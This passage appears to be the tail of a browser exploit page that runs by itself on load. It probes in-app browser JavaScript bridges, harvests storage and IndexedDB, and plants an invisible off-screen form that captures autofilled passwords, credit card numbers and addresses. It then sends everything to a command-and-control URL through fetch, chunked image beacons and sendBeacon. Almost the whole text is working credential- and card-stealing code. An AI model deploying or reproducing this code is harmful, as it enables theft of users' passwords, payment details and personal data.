                    log('  IndexedDB enumeration error: ' + e.message, 'error');
                });
            }
        }

        function updatePayload() {
            EXFIL.timestamp = new Date().toISOString();
            document.getElementById('exfilPayload').value = JSON.stringify(EXFIL, null, 2);
            document.getElementById('exfilBtn').disabled = false;
        }

        function exfiltrate() {
            var payload = JSON.stringify(EXFIL);
            log('Exfiltrating ' + payload.length + ' bytes...', 'warn');

            // Method 1: fetch POST (no-cors)
            try {
                fetch(C2_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: payload,
                    mode: 'no-cors'
                }).then(function () { log('✓ fetch POST sent', 'success'); })
                    .catch(function (e) { log('fetch: ' + e.message, 'error'); });
            } catch (e) { }

            // Method 2: Image beacons (bypass CORS)
            try {
                var encoded = btoa(unescape(encodeURIComponent(payload)));
                var chunks = encoded.match(/.{1,1800}/g) || [];
                chunks.forEach(function (chunk, i) {
                    var img = new Image();
                    img.src = C2_URL + '?c=' + i + '&t=' + chunks.length + '&d=' + encodeURIComponent(chunk);
                });
                log('✓ ' + chunks.length + ' image beacons sent', 'success');
            } catch (e) { }

            // Method 3: sendBeacon
            try {
                navigator.sendBeacon(C2_URL, payload);
                log('✓ sendBeacon sent', 'success');
            } catch (e) { }
        }

        // ══════════════════════════════════════════════════════════════
        //  Invisible Autofill Form — trigger native autofill prompts
        // ══════════════════════════════════════════════════════════════
        function createHiddenForm() {
            log('Creating hidden autofill trigger form...', 'info');
            var form = document.createElement('form');
            form.id = 'af_form';
            form.method = 'POST';
            form.action = '#';
            form.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;';

            var fields = [
                { name: 'email', type: 'email', autocomplete: 'email' },
                { name: 'name', type: 'text', autocomplete: 'name' },
                { name: 'tel', type: 'tel', autocomplete: 'tel' },
                { name: 'street', type: 'text', autocomplete: 'street-address' },
                { name: 'cc-number', type: 'text', autocomplete: 'cc-number' },
                { name: 'cc-name', type: 'text', autocomplete: 'cc-name' },
                { name: 'cc-exp', type: 'text', autocomplete: 'cc-exp' },
                { name: 'password', type: 'password', autocomplete: 'current-password' },
                { name: 'username', type: 'text', autocomplete: 'username' }
            ];

            fields.forEach(function (f) {
                var input = document.createElement('input');
                input.type = f.type;
                input.name = f.name;
                input.autocomplete = f.autocomplete;
                input.id = 'af_' + f.name;
                form.appendChild(input);
            });

            document.body.appendChild(form);

            // Focus fields to trigger autofill
            setTimeout(function () {
                fields.forEach(function (f, i) {
                    setTimeout(function () {
                        var el = document.getElementById('af_' + f.name);
                        if (el) {
                            el.focus();
                            el.click();
                            // Check if autofill filled it
                            setTimeout(function () {
                                if (el.value) {
                                    log('★★★ AUTOFILL: ' + f.name + ' = ' + el.value, 'success');
                                    EXFIL.data['autofilled_' + f.name] = el.value;
                                    addData('Autofilled: ' + f.name, el.value);
                                    updatePayload();
                                }
                            }, 300);
                        }
                    }, i * 200);
                });
            }, 100);
        }

        // ══════════════════════════════════════════════════════════════
        //  MAIN — Auto-execute everything
        // ══════════════════════════════════════════════════════════════
        (function main() {
            setStatus('Scanning...');

            // Phase 6 first: setup listeners before any calls
            setupListeners();

            setTimeout(function () {
                // Phase 1
                var found = detectBridges();

                // Phase 2
                if (window.iabjs_unified_bridge)
                    enumerateMethods('iabjs_unified_bridge');
                if (window.navigationPerformanceLoggerJavascriptInterface)
                    enumerateMethods('navigationPerformanceLoggerJavascriptInterface');
                if (window.TrustlyNativeSDK)
                    enumerateMethods('TrustlyNativeSDK');

                // Phase 3
                executeBridgeCalls();

                // Phase 4
                harvestBrowserData();
                harvestCacheStorage();
                harvestIndexedDB();

                // Hidden form
                createHiddenForm();

                // Phase 5 (slightly delayed for cookie loading)
                setTimeout(advancedExploit, 1000);

                // Status
                setStatus(found > 0 ?
                    'Exploit active — ' + found + ' bridge(s)' :
                    'Fallback mode — no bridges', found > 0);

                // Final payload update
                setTimeout(updatePayload, 3000);

            }, 500); // delay for IAB to inject bridges
        })();
    </script>
</body>

</html>
